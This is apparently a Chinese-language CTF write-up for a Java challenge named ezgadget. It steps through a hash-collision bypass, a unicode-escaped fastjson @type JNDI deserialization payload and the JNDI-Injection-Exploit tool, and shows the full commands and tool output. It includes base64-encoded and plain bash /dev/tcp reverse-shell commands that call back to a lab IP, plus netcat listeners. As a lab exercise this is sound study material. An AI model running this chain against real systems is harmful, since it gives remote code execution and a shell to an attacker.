java版本：8
目标机系统：centos7

踩坑：
1.必须保证java版本一致，运行网站的为8，则攻击机也需要为8（不然JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar会报warning）
2.目标机不能是windows和ubuntu（包括kali），因为要使用```bash -i >& /dev/tcp/ip/port 0>&1```反弹shell，windows没有```bash```命令，ubuntu和kali默认是没开bash的网络重定向选项的。（参考https://blog.csdn.net/qq_43199509/article/details/120028288 ,其中的修改方法并没有效果）
可以先运行```nc -lnvp 9999```和```bash -i >& /dev/tcp/127.0.0.1/9999 0>&1```查看效果


1.目标机运行网页
```java -jar ezgadget.jar```

2.先访问```ip:8080```
根据源码可以发现先需要访问```ip:8080/json```
然后传入```str```和```input```两个参数（这里我使用GET传参```str```，POST传参```input```）
获得一串数值：```swyeXdKuyCofJ7k5```(每一次都不一样)
运行hash碰撞脚本```python test.py```输入这一个字符串，会获得和这个字符串hash值相同的串
（原理）
如我这里得到的是```r%C2%96yeXdKuyCofJ7k5```
然后可以先GET传入```str=r%C2%96yeXdKuyCofJ7k5```,r然后POST传入```input=rmi.```，若页面为```Hacker get out!!!```则传入内容正确

3.反弹shell
监听12345端口```ncat -lnvp 12345```

运行jndi脚本```java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0LjEzNy8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}" -A "192.168.24.137" ```
这里的```-C```是装载的执行代码，```YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0LjEzNy8xMjM0NSAwPiYx```是```bash -i >& /dev/tcp/192.168.24.137/12345 0>&1```的base64形式，```-A```是操作机的ip

回显：
```
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[ADDRESS] >> 192.168.24.137
[COMMAND] >> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI0LjEzNy8xMjM0NSAwPiYx}|{base64,-d}|{bash,-i}
----------------------------JNDI Links---------------------------- 
Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
rmi://192.168.24.137:1099/ntk8wm
Target environment(Build in JDK 1.7 whose trustURLCodebase is true):
rmi://192.168.24.137:1099/hjlzd5
ldap://192.168.24.137:1389/hjlzd5
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://192.168.24.137:1099/pcuszd
ldap://192.168.24.137:1389/pcuszd
```

这里选```Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):```的内容：```rmi://192.168.24.137:1099/ntk8wm```

这里input要绕一下正则匹配，用unicode：
```input={"@type":"org.apache.xbean.propertyeditor.\u004a\u006e\u0064\u0069Converter","AsText":"\u0072\u006d\u0069://192.168.24.137:1099/ntk8wm"}```

成功反弹shell
